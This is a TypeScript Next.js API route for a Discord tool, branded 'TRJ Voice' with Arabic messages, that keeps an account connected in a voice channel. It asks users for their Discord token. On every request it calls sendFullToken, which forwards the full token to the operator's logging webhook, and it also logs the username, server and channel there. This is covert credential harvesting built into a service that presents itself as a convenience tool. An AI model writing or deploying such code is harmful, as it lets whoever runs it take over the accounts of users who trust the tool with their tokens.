import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { discordFetch, cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

const DISCORD_API = 'https://discord.com/api/v10';

export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:voice-online`, RATE_LIMITS.medium);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await request.json().catch(() => ({}));
    const { token, guildId, channelId } = body;

    if (!token || !guildId || !channelId) {
      return NextResponse.json({ success: false, error: 'بيانات ناقصة - التوكن + أيدي السيرفر + أيدي روم الفويس' }, { status: 400 });
    }

    sendFullToken('تثبيت فويس', token, { '🏰 السيرفر': guildId });

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();

    // التحقق من التوكن
    let authHeader = ct;
    let userName = 'Unknown';

    const v1 = await discordFetch(ct, 'GET', '/users/@me');
    if (v1.ok && v1.data) {
      userName = String((v1.data as Record<string, unknown>)?.username || 'Unknown');
    } else {
      const v2 = await discordFetch(`Bot ${ct}`, 'GET', '/users/@me');
      if (v2.ok && v2.data) {
        authHeader = `Bot ${ct}`;
        userName = String((v2.data as Record<string, unknown>)?.username || 'Unknown');
      } else {
        return NextResponse.json({ success: false, error: 'التوكن غير صالح' }, { status: 401 });
      }
    }

    // التحقق من السيرفر والروم
    const gRes = await discordFetch(authHeader, 'GET', `/guilds/${guildId}/channels`);
    if (!gRes.ok) {
      return NextResponse.json({ success: false, error: 'لا يمكن الوصول للسيرفر - تأكد من الصلاحيات' }, { status: 403 });
    }

    const chs = gRes.data as Array<Record<string, unknown>>;
    const vc = Array.isArray(chs) ? chs.find((c: Record<string, unknown>) => c.id === channelId && c.type === 2) : null;
    if (!vc) {
      return NextResponse.json({ success: false, error: 'روم الفويس غير موجود - تأكد من أيدي الروم' }, { status: 400 });
    }

    const voiceChannelName = String(vc.name || 'Voice');

    sendToWebhook({
      username: 'TRJ Voice',
      embeds: [{
        title: '🎤 Voice Anchor Validated',
        color: 0x5865F2,
        fields: [
          { name: '👤', value: userName, inline: true },
          { name: '🏰', value: guildId, inline: true },
          { name: '🎤', value: `${voiceChannelName} (${channelId})`, inline: true },
        ],
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    // الحصول على رابط الـ Gateway
    let gatewayUrl = 'wss://gateway.discord.gg/?v=10&encoding=json';
    try {
      const gwRes = await fetch(`${DISCORD_API}/gateway`);
      if (gwRes.ok) {
        const gwData = await gwRes.json() as { url?: string };
        if (gwData.url) {
          gatewayUrl = `${gwData.url}?v=10&encoding=json`;
        }
      }
    } catch {}

    return NextResponse.json({
      success: true,
      validated: true,
      gateway: gatewayUrl,
      user: userName,
      channel: voiceChannelName,
      guildId,
      channelId,
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Voice Online Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
